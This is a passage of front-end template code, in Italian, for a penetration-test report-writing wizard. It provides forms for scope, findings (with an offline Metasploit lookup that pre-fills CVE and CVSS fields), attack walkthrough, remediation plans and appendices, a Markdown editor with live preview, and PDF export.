.finding-item{{border:1px solid var(--border);border-radius:6px;padding:10px 14px;margin-bottom:8px;background:var(--bg);display:flex;align-items:center;gap:10px;flex-wrap:wrap}}
.finding-item .ft{{font-weight:600;flex:1;min-width:150px;overflow-wrap:anywhere}}
.msf-result{{overflow-wrap:anywhere}}
.scope-row{{display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap}}
.scope-row input{{background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:7px 10px;font-family:inherit;font-size:13px;outline:none;min-width:0;box-sizing:border-box}}
.scope-row .sc-host{{flex:0 1 160px}}
.scope-row .sc-desc{{flex:1 1 120px}}
.md-toolbar{{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px}}
.md-toolbar .btn{{padding:4px 10px;font-size:12px}}
.md-editor{{position:relative;height:60vh;border:1px solid var(--border);border-radius:6px;background:var(--bg);overflow:hidden}}
.md-editor:focus-within{{border-color:var(--accent)}}
.md-hl,.md-src{{margin:0;padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.55;white-space:pre-wrap;word-wrap:break-word;tab-size:2;box-sizing:border-box}}
.md-hl{{position:absolute;inset:0;overflow:hidden;pointer-events:none;color:var(--text)}}
.md-hl code{{font-family:inherit;font-size:inherit}}
.md-src{{position:absolute;inset:0;width:100%;height:100%;background:transparent;color:transparent;caret-color:var(--accent);border:none;outline:none;resize:none;overflow:auto}}
.md-src::selection{{background:rgba(88,166,255,.35);color:transparent}}
.md-src:focus{{border:none}}
.tk-h{{color:var(--accent);font-weight:700}}
.tk-b{{font-weight:700}}
.tk-i{{font-style:italic;color:#d2a8ff}}
.tk-code{{color:#7ee787;background:rgba(110,118,129,.18);border-radius:3px}}
.tk-fence{{color:#7ee787;background:rgba(110,118,129,.12)}}
.tk-link{{color:#79c0ff;text-decoration:underline}}
.tk-com{{color:#8b949e;font-style:italic}}
.tk-list{{color:#d2a8ff;font-weight:700}}
.tk-tbl{{color:#d2a8ff}}
.tk-cap{{color:#e3b341;font-style:italic}}
.md-status{{font-size:11px;color:var(--text2);margin-top:6px;font-family:'JetBrains Mono',monospace}}
.md-legend{{font-size:11px;color:var(--text2);margin-top:8px;line-height:1.6}}
@media(max-width:1200px){{.wiz-layout{{grid-template-columns:150px minmax(0,1fr)}}.wiz-side{{display:none}}}}
@media(max-width:800px){{.wiz-layout{{grid-template-columns:1fr}}.wiz-nav{{flex-direction:row;flex-wrap:wrap}}.md-editor{{height:45vh}}}}
</style>

<div class="wiz-layout">
<div class="wiz-nav" id="wiz-nav"></div>
<div class="wiz-panel" id="wiz-panel"></div>
<div class="wiz-side">
  <div class="wiz-side-title">Anteprima live</div>
  <div class="report-preview" id="wiz-preview"></div>
</div>
</div>
</div>
<script>
{_JS_REPORT_PREPROCESS}
{_JS_REPORT_STYLE}
{_JS_MD_EDITOR}
var SLUG = '{slug_e}';
var DATA = null;
var CUR = 0;
var EDIT_IDX = -1;

var STEPS = [
  {{id:'info',     label:'Cliente & Test'}},
  {{id:'approccio',label:'Approccio'}},
  {{id:'perimetro',label:'Perimetro'}},
  {{id:'findings', label:'Finding (CVE/MSF)'}},
  {{id:'walkthrough', label:'Walkthrough'}},
  {{id:'remediation', label:'Remediation'}},
  {{id:'appendici', label:'Appendici'}},
  {{id:'stile',    label:'Stile'}},
  {{id:'markdown', label:'Markdown'}},
  {{id:'finale',   label:'Considerazioni & PDF'}},
];
var STYLE_PRESETS = {{navy:'Blu navy (default)',red:'Rosso',black:'Nero',green:'Verde',yellow:'Giallo / ambra'}};
var F_IMAGES = [];

function esc(s){{var d=document.createElement('div');d.textContent=s||'';return d.innerHTML;}}

function renderNav(){{
  document.getElementById('wiz-nav').innerHTML = STEPS.map(function(s,i){{
    return '<button class="wiz-step-btn'+(i===CUR?' active':'')+'" onclick="go('+i+')">'+
      '<span class="wiz-dot">'+(i+1)+'</span><span>'+esc(s.label)+'</span></button>';
  }}).join('');
}}

function go(i){{ CUR=i; EDIT_IDX=-1; LAST_PV_ANCHOR=undefined; renderNav(); renderStep(); window.scrollTo({{top:0,behavior:'smooth'}}); }}

function field(id,label,val,ph){{
  return '<div class="wiz-field"><label>'+label+'</label>'+
    '<input type="text" id="'+id+'" value="'+esc(val||'')+'" placeholder="'+esc(ph||'')+'"></div>';
}}
function textarea(id,label,val,h){{
  return '<div class="wiz-field"><label>'+label+'</label>'+
    '<textarea id="'+id+'" style="'+(h?'min-height:'+h+'px':'')+'">'+esc(val||'')+'</textarea></div>';
}}
function gv(id){{var e=document.getElementById(id);return e?e.value.trim():'';}}

function sevSelect(id,val){{
  var opts=[['critical','Critica'],['high','Alta'],['medium','Media'],['low','Bassa'],['info','Info']];
  return '<select id="'+id+'">'+opts.map(function(o){{
    return '<option value="'+o[0]+'"'+(o[0]===val?' selected':'')+'>'+o[1]+'</option>';
  }}).join('')+'</select>';
}}

function sevBadge(sev){{
  var labels={{critical:'Critica',high:'Alta',medium:'Media',low:'Bassa',info:'Info'}};
  return '<span class="sev sev-'+sev+'">'+(labels[sev]||sev)+'</span>';
}}

function renderStep(){{
  var p=document.getElementById('wiz-panel');
  var s=STEPS[CUR].id;
  var m=DATA.meta, sec=DATA.sections;
  var h='';
  if(s==='info'){{
    h='<h3>Cliente &amp; Test</h3><div class="wiz-hint">Nome del cliente e tipo di test: vengono inseriti automaticamente nella cover e in tutto il documento.</div>'+
      field('w-client','Nome del cliente *',m.client,'es. Acme Corp')+
      field('w-rtype','Tipo di test',m.rtype,'Penetration Test Interno')+
      field('w-domain','Dominio target',m.domain,'es. ACME.LOCAL');
  }} else if(s==='approccio'){{
    h='<h3>Approccio</h3><div class="wiz-hint">Il testo della sezione Approccio viene generato in automatico in base al tipo di box e alle date.</div>'+
      '<div class="wiz-field"><label>Tipo di box</label>'+sevSelectBox(m.box)+'</div>'+
      '<div class="wiz-grid2">'+
      field('w-dstart','Data inizio test',m.date_start,'es. 12 gennaio 2026')+
      field('w-tstart','Ora inizio (opzionale)',m.time_start,'es. 09:00')+'</div>'+
      '<div class="wiz-grid2">'+
      field('w-dend','Data fine test',m.date_end,'es. 23 gennaio 2026')+
      field('w-tend','Ora fine (opzionale)',m.time_end,'es. 18:00')+'</div>'+
      '<div class="wiz-hint" id="w-approach-preview"></div>';
  }} else if(s==='perimetro'){{
    h='<h3>Perimetro</h3><div class="wiz-hint">Gli asset in scope: finiscono nella tabella "Dettagli del Perimetro".</div>'+
      '<div id="w-scope"></div>'+
      '<button class="btn" onclick="addScopeRow()">+ Aggiungi riga</button>';
  }} else if(s==='findings'){{
    h='<h3>Finding</h3><div class="wiz-hint">Ogni finding ha una severit&agrave;: i conteggi nel riepilogo e le tabelle si aggiornano automaticamente.</div>'+
      '<div id="w-findings"></div>'+
      '<div id="w-finding-form"></div>';
  }} else if(s==='walkthrough'){{
    h='<h3>Walkthrough</h3><div class="wiz-hint">Racconta la compromissione e i passaggi dell’attacco. Con la toolbar inserisci <strong>immagini con didascalia</strong> e <strong>blocchi di codice</strong> (payload/comandi) nel punto del cursore.</div>'+
      textarea('w-compromissione','Compromissione della rete (introduzione)',sec.compromissione,110)+
      '<div class="wiz-field"><label>Percorso di attacco dettagliato</label>'+
      mdToolbar('w-walkthrough')+
      '<textarea id="w-walkthrough" style="min-height:220px">'+esc(sec.walkthrough||'')+'</textarea></div>';
  }} else if(s==='remediation'){{
    h='<h3>Piano di Remediation</h3><div class="wiz-hint">Elenca le azioni correttive divise per orizzonte temporale (una per riga, con "- "). Le sezioni lasciate vuote non compaiono nel PDF.</div>'+
      textarea('w-rem-breve','Breve termine',sec.remediation_breve,90)+
      textarea('w-rem-medio','Medio termine',sec.remediation_medio,90)+
      textarea('w-rem-lungo','Lungo termine',sec.remediation_lungo,90);
  }} else if(s==='appendici'){{
    h='<h3>Appendici</h3><div class="wiz-hint">Tabelle libere in Markdown. Le appendici lasciate vuote non compaiono nel PDF (né il titolo né spazi vuoti).</div>'+
      textarea('w-app-host','Appendice B — Host compromessi',sec.appendice_host,90)+
      textarea('w-app-utenti','Appendice C — Utenti compromessi',sec.appendice_utenti,90)+
      textarea('w-app-bonifica','Appendice D — Modifiche e bonifica degli host',sec.appendice_bonifica,90)+
      textarea('w-app-password','Appendice E — Analisi delle password del dominio',sec.appendice_password,90);
  }} else if(s==='stile'){{
    var st=m.style||{{}};
    h='<h3>Stile del report</h3><div class="wiz-hint">Colori, logo, autore e firma: applicati al PDF e all’anteprima in tempo reale.</div>'+
      '<div class="wiz-field"><label>Colore principale</label>'+stylePresetSelect(st.preset||'navy')+'</div>'+
      '<div class="wiz-grid2">'+
      field('w-author','Autore del report',st.author,'es. Santarella Martina')+
      field('w-company','Azienda che esegue il test',st.company,'es. SLCtrl')+'</div>'+
      field('w-role','Ruolo (per la firma)',st.role,'Penetration Tester')+
      '<div class="wiz-grid2">'+
      '<div class="wiz-field"><label>Logo del report (cover)</label><input type="file" id="w-logo-file" accept="image/*" onchange="uploadAsset(this,\\'logo\\')">'+
      '<div id="w-logo-cur" style="font-size:12px;color:var(--text2);margin-top:4px">'+(st.logo?'Attuale: '+esc(st.logo):'Nessun logo caricato')+'</div></div>'+
      '<div class="wiz-field"><label>Firma (immagine)</label><input type="file" id="w-sig-file" accept="image/*" onchange="uploadAsset(this,\\'signature\\')">'+
      '<div id="w-sig-cur" style="font-size:12px;color:var(--text2);margin-top:4px">'+(st.signature?'Attuale: '+esc(st.signature):'Firma di default (report/assets/firma.png)')+'</div></div></div>'+
      '<div class="wiz-hint">Se autore e azienda sono vuoti, il blocco firma non compare nel PDF.</div>';
  }} else if(s==='markdown'){{
    h='<h3>Markdown (modifica diretta)</h3>'+
      '<div class="wiz-hint">Modifica il file .md direttamente: l’anteprima a destra <strong>segue il cursore</strong> e si aggiorna mentre scrivi. '+
      'Usa la toolbar per titoli, grassetto, blocchi di codice (payload) e immagini con didascalia. '+
      '<strong>Attenzione</strong>: i blocchi <code>@@AUTO@@</code> sono generati dai dati del wizard — modificali dagli altri step.</div>'+
      mdToolbar('w-md')+
      '<div class="md-editor">'+
      '<pre class="md-hl" id="w-md-hl" aria-hidden="true"><code id="w-md-code"></code></pre>'+
      '<textarea id="w-md" class="md-src" spellcheck="false" wrap="soft">'+esc(DATA.raw||'')+'</textarea>'+
      '</div>'+
      '<div class="md-status" id="w-md-status">Riga 1, Col 1 · 0 caratteri</div>'+
      '<div class="md-legend">Legenda: <code>@@SEZ:nome@@</code> = testo libero (editabile qui) · '+
      '<code>@@AUTO:nome@@</code> = generato dal wizard · <code>: Tabella N: …</code> = didascalia tabella · '+
      '<code>![testo](percorso)</code> = immagine · <code>```</code> = blocco codice · '+
      'scorciatoie: <code>Ctrl+B</code> grassetto, <code>Ctrl+I</code> corsivo, <code>Ctrl+E</code> codice, <code>Ctrl+K</code> link, <code>Tab</code> indenta</div>';
  }} else if(s==='finale'){{
    h='<h3>Considerazioni Finali &amp; PDF</h3><div class="wiz-hint">Osservazioni conclusive, poi genera il PDF finale.</div>'+
      textarea('w-considerazioni','Considerazioni finali',sec.considerazioni,150)+
      '<div id="w-summary"></div>';
  }}
  h+='<div class="wiz-actions">'+
     (CUR>0?'<button class="btn" onclick="go('+(CUR-1)+')">← Indietro</button>':'<span></span>')+
     '<div>'+
     '<button class="btn btn-primary" onclick="saveStep(false)">Salva</button> '+
     (CUR<STEPS.length-1?'<button class="btn btn-primary" onclick="saveStep(true)">Salva e continua →</button>':'')+
     '</div></div>';
  p.innerHTML=h;
  if(s==='perimetro')renderScope();
  if(s==='findings'){{renderFindings();renderFindingForm();}}
  if(s==='finale')renderSummary();
  if(s==='approccio')updateApproachPreview();
  if(s==='markdown'){{
    var _md=document.getElementById('w-md');
    _md.addEventListener('input',function(){{mdSyncEditor();schedulePreview();}});
    _md.addEventListener('keyup',function(){{mdStatus();maybeScrollPreview();}});
    _md.addEventListener('click',function(){{mdStatus();maybeScrollPreview();}});
    _md.addEventListener('scroll',mdSyncScroll);
    _md.addEventListener('keydown',mdKeydown);
    mdSyncEditor();
  }}
  p.querySelectorAll('input,textarea,select').forEach(function(el){{
    el.addEventListener('input',function(){{schedulePreview();}});
    el.addEventListener('change',function(){{schedulePreview();}});
  }});
  refreshPreview();
}}

// ---- Anteprima live ----
var PV_TIMER=null;
function schedulePreview(){{clearTimeout(PV_TIMER);PV_TIMER=setTimeout(refreshPreview,500);}}

// ---- Toolbar Markdown (immagini con didascalia, blocchi codice, ecc.) ----
function mdToolbar(id){{
  return '<div class="md-toolbar">'+
    '<button type="button" class="btn" title="Titolo sezione" onclick="mdInsert(\\''+id+'\\',\\'## \\',\\'\\',\\'Titolo\\')">H2</button>'+
    '<button type="button" class="btn" title="Grassetto" onclick="mdInsert(\\''+id+'\\',\\'**\\',\\'**\\',\\'grassetto\\')"><b>B</b></button>'+
    '<button type="button" class="btn" title="Corsivo" onclick="mdInsert(\\''+id+'\\',\\'*\\',\\'*\\',\\'corsivo\\')"><i>I</i></button>'+
    '<button type="button" class="btn" title="Codice inline" onclick="mdInsert(\\''+id+'\\',\\'`\\',\\'`\\',\\'comando\\')">&lt;/&gt;</button>'+
    '<button type="button" class="btn" title="Blocco codice / payload" onclick="mdCode(\\''+id+'\\')">{{…}} payload</button>'+
    '<button type="button" class="btn" title="Immagine con didascalia" onclick="mdImage(\\''+id+'\\')">🖼 immagine</button>'+
    '<button type="button" class="btn" title="Link" onclick="mdInsert(\\''+id+'\\',\\'[\\',\\'](https://)\\',\\'testo link\\')">🔗 link</button>'+
    '</div>';
}}
function mdInsert(id,before,after,placeholder){{
  var el=document.getElementById(id);
  if(!el)return;
  var s=el.selectionStart||0,e=el.selectionEnd||0;
  var sel=el.value.substring(s,e)||placeholder||'';
  el.value=el.value.substring(0,s)+before+sel+after+el.value.substring(e);
  var ns=Math.min(el.value.length,s+before.length+sel.length+after.length);
  el.selectionStart=el.selectionEnd=ns;
  el.focus();
  if(typeof mdSyncEditor==='function')mdSyncEditor();
  schedulePreview();
}}
function mdCode(id){{mdInsert(id,'\\n\\n```\\n','\\n```\\n','payload o output del comando');}}
function mdImage(id){{
  var inp=document.createElement('input');
  inp.type='file';inp.accept='image/*';
  inp.onchange=function(){{
    if(!inp.files||!inp.files.length)return;
    uploadAssetFile(inp.files[0],'evidence',function(path){{
      var cap=prompt('Didascalia (descrizione sotto l’immagine):')||'';
      mdInsert(id,'\\n\\n!['+(cap||'Figura')+']('+path+')\\n\\n*Figura: '+(cap||'…')+'*\\n\\n','','');
    }});
  }};
  inp.click();
}}

// ---- Ri-posizionamento anteprima sulla sezione in editing ----
var STEP_ANCHORS={{info:'',approccio:'Approccio',perimetro:'Perimetro',findings:'Dettagli Tecnici',
  walkthrough:'Compromissione',remediation:'Piano di Remediation',appendici:'Appendici',
  stile:'',markdown:'',finale:'Considerazioni Finali'}};
var LAST_PV_ANCHOR;
function scrollPreviewTo(anchor){{
  var el=document.getElementById('wiz-preview');
  if(!el)return;
  if(!anchor){{el.scrollTop=0;return;}}
  var hs=el.querySelectorAll('h1,h2,h3');
  var a=anchor.toLowerCase().substring(0,20);
  for(var i=0;i<hs.length;i++){{
    if(hs[i].textContent.toLowerCase().indexOf(a)>=0){{
      var r=hs[i].getBoundingClientRect(),er=el.getBoundingClientRect();
      el.scrollTop+=r.top-er.top-10;
      return;
    }}
  }}
}}
function mdCursorAnchor(){{
  var el=document.getElementById('w-md');
  if(!el)return '';
  var upto=el.value.substring(0,el.selectionStart||0);
  var m=upto.match(/^#{{1,3}}\\s+.+$/gm);
  if(!m)return '';
  return m[m.length-1].replace(/^#+\\s+/,'').replace(/<[^>]+>/g,'').replace(/\\*\\*/g,'').trim();
}}
function currentAnchor(){{
  if(STEPS[CUR].id==='markdown')return mdCursorAnchor();
  return STEP_ANCHORS[STEPS[CUR].id]||'';
}}
function maybeScrollPreview(){{
  var a=currentAnchor();
  if(a!==LAST_PV_ANCHOR){{LAST_PV_ANCHOR=a;scrollPreviewTo(a);}}
}}
function collectDraft(){{
  var meta=JSON.parse(JSON.stringify(DATA.meta));
  var sections={{}};
  var s=STEPS[CUR].id;
  if(s==='info'){{meta.client=gv('w-client');meta.rtype=gv('w-rtype');meta.domain=gv('w-domain');}}
  else if(s==='approccio'){{meta.box=gv('w-box');meta.date_start=gv('w-dstart');meta.date_end=gv('w-dend');meta.time_start=gv('w-tstart');meta.time_end=gv('w-tend');}}
  else if(s==='perimetro'){{meta.scope=(meta.scope||[]).filter(function(r){{return (r.host||'').trim()||(r.desc||'').trim();}});}}
  else if(s==='walkthrough'){{sections.compromissione=document.getElementById('w-compromissione').value;sections.walkthrough=document.getElementById('w-walkthrough').value;}}
  else if(s==='remediation'){{sections.remediation_breve=document.getElementById('w-rem-breve').value;sections.remediation_medio=document.getElementById('w-rem-medio').value;sections.remediation_lungo=document.getElementById('w-rem-lungo').value;}}
  else if(s==='appendici'){{sections.appendice_host=document.getElementById('w-app-host').value;sections.appendice_utenti=document.getElementById('w-app-utenti').value;sections.appendice_bonifica=document.getElementById('w-app-bonifica').value;sections.appendice_password=document.getElementById('w-app-password').value;}}
  else if(s==='stile'){{
    meta.style=meta.style||{{}};
    meta.style.preset=gv('w-preset');
    meta.style.color='';meta.style.color2='';
    meta.style.author=gv('w-author');meta.style.company=gv('w-company');meta.style.role=gv('w-role');
  }}
  else if(s==='finale'){{sections.considerazioni=document.getElementById('w-considerazioni').value;}}
  return {{meta:meta,sections:sections}};
}}
function renderPreviewMd(md,meta){{
  var el=document.getElementById('wiz-preview');
  if(!el)return;
  el.innerHTML=reportCoverHtml(meta)+marked.parse(preprocessReportMd(md));
  applyReportStyleTo(el,meta);
}}
function refreshPreview(){{
  var s=STEPS[CUR].id;
  var d=collectDraft();
  if(s==='markdown'){{
    var t=document.getElementById('w-md').value;
    renderPreviewMd(t,d.meta);
    maybeScrollPreview();
    return;
  }}
  fetch('/api/report/preview',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{slug:SLUG,meta:d.meta,sections:d.sections}})
  }}).then(r=>r.json()).then(function(res){{
    if(res.ok){{renderPreviewMd(res.md,d.meta);maybeScrollPreview();}}
  }}).catch(()=>{{}});
}}

function sevSelectBox(val){{
  var opts=[['black','Black box — nessuna conoscenza preliminare'],['grey','Grey box — conoscenza/credenziali parziali'],['white','White box — piena visibilità']];
  return '<select id="w-box" onchange="updateApproachPreview()">'+opts.map(function(o){{
    return '<option value="'+o[0]+'"'+(o[0]===val?' selected':'')+'>'+o[1]+'</option>';
  }}).join('')+'</select>';
}}
function updateApproachPreview(){{
  var el=document.getElementById('w-approach-preview');
  if(el)el.textContent='Il testo dell’approccio verrà rigenerato al salvataggio in base al box selezionato.';
}}

// ---- Perimetro ----
function renderScope(){{
  var w=document.getElementById('w-scope');
  w.innerHTML=DATA.meta.scope.map(function(r,i){{
    return '<div class="scope-row">'+
      '<input type="text" class="sc-host" value="'+esc(r.host)+'" placeholder="IP / host / URL" onchange="DATA.meta.scope['+i+'].host=this.value">'+
      '<input type="text" class="sc-desc" value="'+esc(r.desc)+'" placeholder="Descrizione" onchange="DATA.meta.scope['+i+'].desc=this.value">'+
      '<button class="btn btn-danger" onclick="DATA.meta.scope.splice('+i+',1);renderScope();schedulePreview()">×</button></div>';
  }}).join('') || '<p style="color:var(--text2);font-size:12px;margin-bottom:8px">Nessun asset in scope.</p>';
}}
function addScopeRow(){{DATA.meta.scope.push({{host:'',desc:''}});renderScope();schedulePreview();}}

// ---- Findings ----
function renderFindings(){{
  var w=document.getElementById('w-findings');
  var fs=DATA.meta.findings;
  if(!fs.length){{w.innerHTML='<p style="color:var(--text2);font-size:12px;margin-bottom:10px">Nessun finding ancora. Aggiungine uno qui sotto.</p>';return;}}
  w.innerHTML=fs.map(function(f,i){{
    return '<div class="finding-item"><span style="color:var(--text2);font-size:12px">SLC-'+String(i+1).padStart(2,'0')+'</span>'+
      sevBadge(f.severity)+'<span class="ft">'+esc(f.title)+'</span>'+
      '<button class="btn" onclick="editFinding('+i+')">Modifica</button>'+
      '<button class="btn btn-danger" onclick="delFinding('+i+')">×</button></div>';
  }}).join('');
}}
function renderFindingForm(){{
  var f = EDIT_IDX>=0 ? DATA.meta.findings[EDIT_IDX] : {{}};
  F_IMAGES = (f.images||[]).map(function(im){{return {{path:im.path,caption:im.caption}};}});
  F_MSFCVES = (f.cves||[]).slice();
  F_MSFMOD = f.msf||'';
  var t = EDIT_IDX>=0 ? 'Modifica finding SLC-'+String(EDIT_IDX+1).padStart(2,'0') : 'Nuovo finding';
  document.getElementById('w-finding-form').innerHTML =
    '<div style="border:1px solid var(--border);border-radius:8px;padding:16px;margin-top:10px;background:var(--surface2)">'+
    '<div style="font-weight:700;margin-bottom:10px;color:var(--accent)">'+t+'</div>'+
    '<div class="wiz-field"><label>Cerca CVE / modulo in Metasploit (offline — “Usa” compila <strong>tutti</strong> i campi)</label>'+
    '<div style="display:flex;gap:8px"><input type="text" id="f-msf-q" placeholder="es. CVE-2017-0143 oppure eternalblue" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-family:inherit;font-size:13px">'+
    '<button class="btn" onclick="msfSearch()">Cerca in MSF</button></div></div>'+
    '<div id="f-msf-results"></div>'+
    field('f-title','Titolo *',f.title,'es. LLMNR/NBT-NS Response Spoofing')+
    '<div class="wiz-grid2">'+
    '<div class="wiz-field"><label>Severità</label>'+sevSelect('f-sev',f.severity||'high')+'</div>'+
    field('f-cvss','CVSS 3.1',f.cvss,'es. 9.5')+'</div>'+
    '<div class="wiz-grid2">'+
    field('f-cwe','CWE (solo numero)',f.cwe,'es. 522')+
    field('f-assets','Asset interessati',f.assets,DATA.meta.domain)+'</div>'+
    '<div class="wiz-field"><label>CVE associate</label><div id="f-cves" style="font-size:12px;color:var(--accent);font-family:monospace;min-height:16px">'+esc(F_MSFCVES.join(', '))+'</div></div>'+
    textarea('f-desc','Descrizione (incl. causa)',f.description,70)+
    textarea('f-impact','Impatto',f.impact,60)+
    textarea('f-remediation','Remediation',f.remediation,60)+
    field('f-refs','Riferimenti (URL)',f.refs,'https://nvd.nist.gov/vuln/detail/CVE-...')+
    textarea('f-evidence','Evidenze testuali (output comandi)',f.evidence,70)+
    '<div class="wiz-field"><label>Immagini evidenza (con didascalia sotto)</label>'+
    '<div id="f-images"></div>'+
    '<div style="display:flex;gap:8px;align-items:center;margin-top:6px">'+
    '<input type="file" id="f-img-file" accept="image/*" style="font-size:12px;color:var(--text2)">'+
    '<input type="text" id="f-img-cap" placeholder="Didascalia (contesto sotto l’immagine)" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:7px 10px;font-family:inherit;font-size:12px">'+
    '<button class="btn" onclick="uploadFindingImage()">+ Immagine</button></div></div>'+
    '<button class="btn btn-primary" onclick="saveFinding()">'+(EDIT_IDX>=0?'Salva modifica':'+ Aggiungi finding')+'</button> '+
    (EDIT_IDX>=0?'<button class="btn" onclick="EDIT_IDX=-1;renderFindingForm()">Annulla</button>':'')+
    '</div>';
  renderFImages();
}}

// ---- Ricerca Metasploit (offline) ----
var MSF_RESULTS = [];
var F_MSFCVES = [];
var F_MSFMOD = '';
function msfSearch(){{
  var q=gv('f-msf-q');
  if(!q){{alert('Scrivi una CVE o un nome modulo da cercare.');return;}}
  var box=document.getElementById('f-msf-results');
  box.innerHTML='<p style="font-size:12px;color:var(--text2)">Ricerca nel db locale di Metasploit… (può richiedere alcuni secondi)</p>';
  fetch('/api/report/msf-search?q='+encodeURIComponent(q))
  .then(r=>r.json()).then(d=>{{
    if(!d.ok){{box.innerHTML='<p style="font-size:12px;color:var(--red)">'+esc(d.error||'Ricerca non disponibile')+'</p>';return;}}
    MSF_RESULTS=d.results||[];
    if(!MSF_RESULTS.length){{box.innerHTML='<p style="font-size:12px;color:var(--text2)">Nessun modulo trovato per questa ricerca.</p>';return;}}
    box.innerHTML='<div style="font-size:11px;color:var(--text2);margin-bottom:6px">'+MSF_RESULTS.length+' moduli (fonte: '+esc(d.source)+') — clicca “Usa” per compilare il finding:</div>'+
      MSF_RESULTS.map(function(r,i){{
        return '<div class="msf-result"><span class="msf-name">'+esc(r.fullname)+'</span> '+sevBadge(r.severity)+
          (r.cves&&r.cves.length?' <span class="msf-cve">'+esc(r.cves.join(', '))+'</span>':'')+
          ' <button class="btn" style="float:right;padding:2px 10px;font-size:11px" onclick="msfUse('+i+')">Usa</button>'+
          '<div class="msf-desc">'+esc((r.description||'').slice(0,180))+'</div></div>';
      }}).join('');
  }}).catch(()=>{{box.innerHTML='<p style="font-size:12px;color:var(--red)">Errore di rete</p>';}});
}}
function msfUse(i){{
  var r=MSF_RESULTS[i]; if(!r)return;
  document.getElementById('f-title').value=r.name.replace(/_/g,' ');
  document.getElementById('f-sev').value=r.severity;
  document.getElementById('f-desc').value=r.description||('Modulo Metasploit: '+r.fullname);
  F_MSFCVES=(r.cves||[]).slice();
  F_MSFMOD=r.fullname||'';
  document.getElementById('f-cves').textContent=F_MSFCVES.join(', ');
  // compila TUTTE le caselle con i dati offline del modulo MSF
  if(r.cwe)document.getElementById('f-cwe').value=r.cwe;
  if(r.cvss)document.getElementById('f-cvss').value=r.cvss+' (stima)';
  if(r.impact)document.getElementById('f-impact').value=r.impact;
  if(r.remediation)document.getElementById('f-remediation').value=r.remediation;
  if(!gv('f-assets')){{
    var hosts=(DATA.meta.scope||[]).map(function(x){{return (x.host||'').trim();}}).filter(function(x){{return x;}});
    document.getElementById('f-assets').value=hosts.join(', ')||DATA.meta.domain||'';
  }}
  document.getElementById('f-refs').value=r.refs_fmt||(F_MSFCVES.length?
    F_MSFCVES.map(function(c){{return 'https://nvd.nist.gov/vuln/detail/'+c;}}).join(' '):
    'https://www.rapid7.com/db/modules/'+r.fullname);
  document.getElementById('f-msf-results').innerHTML='<p style="font-size:12px;color:var(--green)">✔ Tutti i campi compilati da '+esc(r.fullname)+' — controllali e adattali al caso specifico.</p>';
}}

// ---- Immagini evidenza ----
function renderFImages(){{
  var w=document.getElementById('f-images');
  if(!w)return;
  w.innerHTML=F_IMAGES.map(function(im,i){{
    return '<div class="fimg-row"><span class="fimg-path">'+esc(im.path)+'</span>'+
      '<span style="color:var(--text2)">'+esc(im.caption||'(nessuna didascalia)')+'</span>'+
      '<button class="btn btn-danger" style="padding:2px 8px;font-size:11px" onclick="F_IMAGES.splice('+i+',1);renderFImages()">×</button></div>';
  }}).join('')||'<p style="font-size:11px;color:var(--text2);margin:2px 0">Nessuna immagine allegata.</p>';
}}
function uploadFindingImage(){{
  var fi=document.getElementById('f-img-file');
  if(!fi.files||!fi.files.length){{alert('Scegli un file immagine.');return;}}
  uploadAssetFile(fi.files[0],'evidence',function(path){{
    F_IMAGES.push({{path:path,caption:gv('f-img-cap')}});
    document.getElementById('f-img-cap').value=''; fi.value='';
    renderFImages();
  }});
}}

// ---- Upload asset (immagini evidenza, logo, firma) ----
function uploadAssetFile(file,kind,cb){{
  var reader=new FileReader();
  reader.onload=function(){{
    var b64=reader.result.split(',')[1];
    fetch('/api/report/asset',{{method:'POST',headers:{{'Content-Type':'application/json'}},
      body:JSON.stringify({{slug:SLUG,kind:kind,filename:file.name,data:b64}})
    }}).then(r=>r.json()).then(d=>{{
      if(d.ok)cb(d.path); else alert(d.error||'Upload fallito');
    }}).catch(()=>alert('Errore di rete durante l’upload'));
  }};
  reader.readAsDataURL(file);
}}
function uploadAsset(input,kind){{
  if(!input.files||!input.files.length)return;
  uploadAssetFile(input.files[0],kind,function(path){{
    DATA.meta.style=DATA.meta.style||{{}};
    if(kind==='logo'){{DATA.meta.style.logo=path;document.getElementById('w-logo-cur').textContent='Attuale: '+path;}}
    else {{DATA.meta.style.signature=path;document.getElementById('w-sig-cur').textContent='Attuale: '+path;}}
  }});
}}

// ---- Stile ----
function stylePresetSelect(val){{
  return '<select id="w-preset">'+Object.keys(STYLE_PRESETS).map(function(k){{
    return '<option value="'+k+'"'+(k===val?' selected':'')+'>'+STYLE_PRESETS[k]+'</option>';
  }}).join('')+'</select>';
}}
function editFinding(i){{EDIT_IDX=i;renderFindingForm();window.scrollTo({{top:document.getElementById('w-finding-form').offsetTop-60,behavior:'smooth'}});}}
function saveFinding(){{
  var title=gv('f-title');
  if(!title){{alert('Inserisci il titolo del finding.');return;}}
  var f={{title:title,severity:gv('f-sev'),cvss:gv('f-cvss'),cwe:gv('f-cwe'),
         cves:F_MSFCVES.slice(),msf:F_MSFMOD,
         assets:gv('f-assets'),description:document.getElementById('f-desc').value,
         impact:document.getElementById('f-impact').value,
         remediation:document.getElementById('f-remediation').value,
         refs:gv('f-refs'),evidence:document.getElementById('f-evidence').value,
         images:F_IMAGES.slice()}};
  fetch('/api/report/finding',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{slug:SLUG,index:EDIT_IDX>=0?EDIT_IDX:null,finding:f}})
  }}).then(r=>r.json()).then(d=>{{
    if(d.ok){{EDIT_IDX=-1;loadData();}}
    else alert(d.error||'Errore');
  }}).catch(()=>alert('Errore di rete'));
}}
function delFinding(i){{
  if(!confirm('Eliminare il finding SLC-'+String(i+1).padStart(2,'0')+'?'))return;
  fetch('/api/report/finding/delete',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{slug:SLUG,index:i}})
  }}).then(r=>r.json()).then(d=>{{if(d.ok)loadData();else alert(d.error||'Errore');}})
  .catch(()=>alert('Errore di rete'));
}}

// ---- Sommario finale ----
function renderSummary(){{
  var fs=DATA.meta.findings;
  var c={{critical:0,high:0,medium:0,low:0,info:0}};
  fs.forEach(function(f){{if(c[f.severity]!==undefined)c[f.severity]++;}});
